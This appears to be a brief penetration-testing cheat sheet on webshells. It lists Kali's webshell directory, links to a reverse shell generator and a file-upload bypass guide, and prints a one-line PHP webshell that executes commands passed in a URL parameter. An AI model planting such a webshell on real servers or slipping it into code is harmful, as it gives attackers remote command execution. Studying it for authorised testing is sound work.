## Intro
Who doesn't like the RCE on demand?

List webshells available on Kali
```
tree /usr/share/webshells/
```

## Revshells
Great reverse shell generator

https://www.revshells.com/

## File Upload bypass
If website blocks upload of your webshell, try this

https://book.hacktricks.xyz/pentesting-web/file-upload

## Apache
Basic PHP webshell
```
# Take input from the URL paramter. e.g http://<IP>/shell.php?cmd=whoami
<?php system($_GET['cmd']); ?>
```
